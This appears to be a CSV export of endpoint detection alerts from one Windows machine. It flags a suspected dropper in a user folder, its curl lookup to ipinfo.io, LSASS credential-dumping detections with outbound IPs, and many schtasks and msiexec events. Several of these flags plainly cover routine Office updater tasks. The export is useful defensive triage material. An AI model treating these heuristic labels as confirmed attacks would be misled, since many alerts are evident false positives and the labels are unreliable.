"Jun 1, 2026 @ 14:23:04.754",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_bz2.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E72509A2
"Jun 1, 2026 @ 14:23:04.751",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140_1.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-54772DE8
"Jun 1, 2026 @ 14:23:04.761",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_decimal.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2D96161D
"Jun 1, 2026 @ 14:23:04.763",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_hashlib.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E0102BE8
"Jun 1, 2026 @ 14:22:58.748",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\pyarmor_runtime_000000\pyarmor_runtime.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-84C0EEDB
"Jun 1, 2026 @ 14:23:04.756",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_ctypes.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6B990D6C
"Jun 1, 2026 @ 14:22:59.240",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E8ACEDD0
"Jun 1, 2026 @ 14:22:59.216",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-CFFD6764
"Jun 1, 2026 @ 14:22:59.191",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A3C3CD65
"Jun 1, 2026 @ 14:22:59.120",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-888559A7
"Jun 1, 2026 @ 14:22:58.838",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F262D965
"Jun 1, 2026 @ 14:22:58.837",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\unicodedata.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-0619DC48
"Jun 1, 2026 @ 14:22:58.828",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\select.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D69284F2
"Jun 1, 2026 @ 14:22:58.825",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python313.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9B6B013F
"Jun 1, 2026 @ 14:22:58.750",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python3.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-0BA64E59
"Jun 1, 2026 @ 14:22:59.464",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A7E23538
"Jun 1, 2026 @ 14:22:59.409",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-808E1AD1
"Jun 1, 2026 @ 14:22:59.437",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A0C7FDF4
"Jun 1, 2026 @ 14:22:59.300",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2FF960D6
"Jun 1, 2026 @ 14:22:59.323",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-99B251BC
"Jun 1, 2026 @ 14:23:27.265",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-168F2198
"Jun 1, 2026 @ 14:23:27.273",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3412C030
"Jun 1, 2026 @ 14:24:20.654",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 23.37.85.99 ; Unusual process accessing LSASS memory,173.10.254.170,23.37.85.99,,,,disconnect_received,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-3129483B
"Jun 1, 2026 @ 14:21:05.415",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"28,276",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-7C57DEEC
"Jun 1, 2026 @ 14:24:20.573",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 104.18.20.213 ; Unusual process accessing LSASS memory,173.10.254.170,104.18.20.213,,,,disconnect_received,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-6FE49800
"Jun 1, 2026 @ 14:21:06.112",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\FrequentOfficeUpdateSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"26,680",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-552E204E
"Jun 1, 2026 @ 14:21:06.399",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\FrequentOfficeUpdateSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"26,680",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-C19DE018
"Jun 1, 2026 @ 14:21:05.153",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"28,276",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-3BCAC74A
"Jun 1, 2026 @ 14:21:18.116",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Startup Maintenance"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Startup Maintenance.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"22,372",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-D44B6BDC
"Jun 1, 2026 @ 14:21:57.140",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Background Push Maintenance"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\PushRegistrationTask.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"12,400",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-632DDB4C
"Jun 1, 2026 @ 14:21:57.046",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Background Push Maintenance"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\PushRegistrationTask.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"12,400",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-D56A2A89
"Jun 1, 2026 @ 14:21:45.827",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,60,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\thm.wxl,,deletion,"29,508",,,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BD697DFE
"Jun 1, 2026 @ 14:21:47.395",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,60,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\thm.wxl,,deletion,"34,308",,,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5287089C
"Jun 1, 2026 @ 14:21:47.392",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,60,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1045\license.rtf,,deletion,"34,308",,,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-72251B2B
"Jun 1, 2026 @ 14:21:17.622",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Performance Monitor"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Performance Monitor.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"22,780",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-45AD48AF
"Jun 1, 2026 @ 14:21:17.938",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Actions Server"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Actions Server.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"21,536",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-CDA4912F
"Jun 1, 2026 @ 14:21:17.827",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Actions Server"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Actions Server.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"21,536",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-B2BFA110
"Jun 1, 2026 @ 14:21:17.730",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Performance Monitor"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Performance Monitor.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"22,780",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-FC61899A
"Jun 1, 2026 @ 14:21:18.032",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Startup Maintenance"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Startup Maintenance.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"22,372",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-3F644C76
"Jun 1, 2026 @ 14:21:17.312",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"30,448",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-D4F26863
"Jun 1, 2026 @ 14:21:17.212",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"30,448",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-EBA7AC17
"Jun 1, 2026 @ 14:21:17.497",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates Logon"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates Logon.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"20,308",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-FE8B6216
"Jun 1, 2026 @ 14:21:17.403",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates Logon"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates Logon.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"20,308",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-5B6FB890
"Jun 1, 2026 @ 14:23:20.048",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 103.243.115.105 ; Unusual process accessing LSASS memory,173.10.254.170,103.243.115.105,,,,disconnect_received,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-E95CEC62
"Jun 1, 2026 @ 14:23:20.035",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 103.243.115.105 ; Unusual process accessing LSASS memory,173.10.254.170,103.243.115.105,,,,connection_attempted,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-F62F6AD2
"Jun 1, 2026 @ 14:23:20.090",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 23.37.85.99 ; Unusual process accessing LSASS memory,173.10.254.170,23.37.85.99,,,,connection_attempted,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-72877E7A
"Jun 1, 2026 @ 14:23:20.181",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 104.18.20.213 ; Unusual process accessing LSASS memory,173.10.254.170,104.18.20.213,,,,connection_attempted,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-DA8D6BE4
"Jun 1, 2026 @ 14:23:20.786",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon tool query: curl -s --max-time 10 https://ipinfo.io/country,,,,,,end,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-F87AF2D7
"Jun 1, 2026 @ 14:23:19.773",C:\Windows\System32\curl.exe,,,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,lookup_result,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-41EEFF19
"Jun 1, 2026 @ 14:23:19.753",C:\Windows\System32\curl.exe,,,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,lookup_requested,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-1CE9E09F
"Jun 1, 2026 @ 14:23:19.684",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,LOLBin Abuse | Recon / IP Discovery,55,Living-off-the-land binary: curl.exe ; Recon tool query: curl -s --max-time 10 https://ipinfo.io/country,,,,,,start,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-50EEF7A3
"Jun 1, 2026 @ 14:21:42.918",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMP71.tmp,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-63A6B420
"Jun 1, 2026 @ 14:21:41.269",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\syswow64\MsiExec.exe -Embedding F3E2DB8F4304A6E67BD72B7063113D52 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"22,992",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-3BAFE7F2
"Jun 1, 2026 @ 14:23:19.774",C:\Windows\System32\curl.exe,,,LOLBin Abuse,50,Living-off-the-land binary: curl.exe,127.0.0.1,127.0.0.1,,,,disconnect_received,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-F9F97D76
"Jun 1, 2026 @ 14:23:15.317",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-309A65F9
"Jun 1, 2026 @ 14:21:38.098",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\syswow64\MsiExec.exe -Embedding 189C0A08651FD6F8AF60DDA3DCD42393 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"37,284",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-364541E1
"Jun 1, 2026 @ 14:21:39.510",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMPF322.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-91049CC4
"Jun 1, 2026 @ 14:21:40.968",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMPF8D0.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-1B422589
"Jun 1, 2026 @ 14:21:41.675",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\System32\MsiExec.exe -Embedding 17B454BD89D4606AD8583AC7E96BFAA3 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"25,464",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-B1DD9025
"Jun 1, 2026 @ 14:21:43.246",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFF2C6E40CCAD2504D.TMP,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-675005A4
"Jun 1, 2026 @ 14:21:41.000",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 0F11E21D2A1C2C53A06BA3DAFA972429 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"12,192",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-53835A8A
"Jun 1, 2026 @ 14:23:12.342",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nqu2ntqj.lvi.psm1,,creation,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-007F7F6D
"Jun 1, 2026 @ 14:23:10.834",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_qc1sd1u2.15i.psm1,,creation,"6,972",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-FB5C24DF
"Jun 1, 2026 @ 14:21:44.259",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\syswow64\MsiExec.exe -Embedding F3E2DB8F4304A6E67BD72B7063113D52 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"22,992",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-FE4641AB
"Jun 1, 2026 @ 14:23:11.847",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-469341AA
